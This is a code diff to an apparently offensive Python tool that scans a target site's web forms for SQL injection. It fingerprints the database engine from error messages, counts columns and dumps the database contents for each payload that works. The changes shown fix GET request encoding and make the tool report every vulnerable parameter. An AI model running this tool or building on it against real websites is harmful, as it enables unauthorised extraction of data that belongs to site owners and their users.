@@ -2,6 +2,7 @@ from requests_html import HTMLSession
 from urllib.parse import urljoin
 from pprint import pprint
 import argparse
+from urllib.parse import urlencode
 import requests
 from utils import get_all_forms, get_form_details, diff_html
 
@@ -29,7 +30,8 @@ def make_request(injectable_input, form_details, payload, method):
 			data[input_tag["name"]] = "eXaMpl34Tst"
 	if method == "POST":
 		return requests.post(args.url, data=data)
-	return requests.get(args.url + data)
+	url_encoded_data = urlencode(data)
+	return requests.get(f"{args.url}?{url_encoded_data}")
 
 
 
@@ -41,6 +43,8 @@ def detect_error(diff):
 		"mssql": ["Microsoft OLE DB Provider for SQL Server", "Unclosed quotation mark after the character string"], 
 		"oracle": ["Oracle Database Error"]
 	}
+	if diff == None:
+		return "Unknown"
 	for elt in diff:
 		for engine, error_messages in errors.items():
 			for error_message in error_messages:
@@ -51,7 +55,6 @@ def detect_error(diff):
 def detect_database_engine(form_details, method):
 	page = requests.get(args.url)
 	working = []
-	engine = "Unknown"
 	for payload in entrypoints:
 		for input_tag in form_details["inputs"]:
 			if input_tag["type"] != "submit":		
@@ -92,10 +95,17 @@ if __name__ == "__main__":
 	forms = get_all_forms(args.url)
 	for form in forms:
 		form_details = get_form_details(form)
-		engine = detect_database_engine(form_details, args.X)
-		# print(engine)
-		columns = detect_number_of_columns(engine[0][2], form_details, engine[0][1], args.X)
-		# print(columns)
-		print("PAYLOAD USED: ", engine[0][1])
-		print("ENGINE: ", engine[0][0])
-		print("DATABASE DUMP: ", dump_database(engine[0][2], engine[0][1], form_details, columns, "sqlite"))
+		if (form_details["method"].lower() != args.X.lower()):
+			continue
+		print(form_details)
+		payload_working = detect_database_engine(form_details, args.X)
+		if payload_working == []:
+			print("No SQL injection found")
+			exit(0)
+		for payload in payload_working:
+			columns = detect_number_of_columns(payload[2], form_details, payload[1], args.X)
+			print("PAYLOAD USED: ", payload[1])
+			print("VULNERABLE PARAMETER: ", payload[2])
+			print("ENGINE: ", payload[0])
+			print("DATABASE DUMP: ", dump_database(payload[2], payload[1], form_details, columns, "sqlite"))
+			print("-" * 100)
